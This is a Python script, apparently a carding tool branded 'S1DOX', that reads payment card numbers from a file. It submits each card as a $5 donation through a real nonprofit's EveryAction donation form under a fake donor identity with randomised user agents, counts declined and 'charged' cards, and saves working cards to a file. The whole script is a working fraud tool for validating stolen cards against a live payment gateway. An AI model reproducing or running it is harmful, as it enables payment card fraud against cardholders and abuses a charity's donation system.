import requests
import re
import uuid
from user_agent import generate_user_agent
import pyfiglet
from colorama import Fore
blue = Fore.BLUE
green = Fore.LIGHTGREEN_EX
red = Fore.RED
white = Fore.WHITE
yellow = Fore.YELLOW
black = Fore.LIGHTMAGENTA_EX
light_blue = Fore.LIGHTYELLOW_EX
purple = Fore.LIGHTMAGENTA_EX
Baby_Blue = Fore.LIGHTCYAN_EX
print(yellow + "-" * 65)
ascii_art = pyfiglet.figlet_format("S1DOX", font="georgia11")
colored_ascii_art = purple + ascii_art
print(colored_ascii_art)
print('~~> 𝒕𝒉𝒊𝒔 𝒕𝒐𝒐𝒍 𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒅 𝒃𝒚丂ㄥ卂ㄚ乇尺 𝒇𝒐𝒓 𝒄𝒉𝒆𝒄𝒌 𝒄𝒄 𝒃𝒚 𝒄𝒏𝒏 𝒈𝒂𝒕𝒆𝒘𝒂𝒚 ߷')
print(yellow + "-" * 65)
print('')
declined = 0
charge = 0
def process_card(P):
    global declined, charge
    n = P.split('|')[0]
    mm = P.split('|')[1]
    if "0" not in mm and int(mm) <= 9:
        mm = f"0{mm}"
    yy = P.split('|')[2]
    if "20" in yy:
        yy = yy[2:]
    P = P.replace('\n', '')
    user = generate_user_agent()
    ClientSubmissionId = uuid.uuid4()
    FormSessionId = uuid.uuid4()
    headers = {
    'authority': 'secure.everyaction.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://radmovement.org',
    'referer': 'https://radmovement.org/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

    data = f'ProcessingCurrency=USD&designationName=Rights+%26+Democracy+(C4)&SelectedFrequency=0&Amount=5.00&CoverCostsAmount=0.36&IsRecurring=false&FirstName=Warrior&LastName=Dad&AddressLine1=Was&PostalCode=10010&City=New+York&StateProvince=NY&EmailAddress=cizxmdeq%40hi2.in&MobilePhone=3063734499&MobilePhoneCountryCode=ca&MobilePhoneInternationalDialingPrefix=1&SmsSubscribeMobilePhone=true&YesSignMeUpForUpdatesForBinder=true&PaymentMethod=creditcard&Account={n}&ExpirationMonth={mm}&ExpirationYear={yy}&RedactedAccount={n}&RedactedExpirationMonth={mm}&RedactedExpirationYear={yy}&FormVersion=3%2F25%2F2024+4%3A04%3A04+PM%7C&type=ContributionForm&FormSessionId=5b16ce53-2cac-46a2-91ed-b62b6fbbeb34&ClientSubmissionId=1ff192c1-c66e-4401-9e74-8e387985444b&BrowserName=chrome&DeviceType=mobile&XFromApp=ActionTag&ActionTagBaseUrl=https%3A%2F%2Fstatic.everyaction.com%2Fea-actiontag%2F'

    try:
                response = requests.post('https://secure.everyaction.com/v2/Forms/jjG5CBnmX0uN0XirAZBKNA2', headers=headers, data=data)
                msg = re.findall('"text":"(.*?)"', response.text)
                if msg:
                	msg2 = msg[0].replace("Please contact us for assistance.", "")
                	if 'There was a complication processing your payment.' in msg2:
                	   declined += 1
                	elif 'Invalid card number.' in msg2:
                	   declined += 1
                	elif "This submission looks like a duplicate. If you do want to submit again please wait 2 seconds" in msg :
                	   declined += 1
                	else:
                	       charge += 1
                	       with open('Cnn_Charge.txt') as f:
                	       	f.write(f"{P}\n")
                print(f"  {Baby_Blue}𝗖𝗔𝗥𝗗 ❥ {white}: {light_blue}{n}{green}:{light_blue}{mm}{green}:{light_blue}{yy} {white}| {green}ℂℍ𝔸ℝ𝔾𝔼 {white}: {black}{charge} {white}| {red}𝔻𝔼ℂ𝕃𝕀ℕ𝔼𝔻{white} : {black}{declined}", end="\r")
    except :
    	pass

for P in open('cc.txt',"r"):
	process_card(P)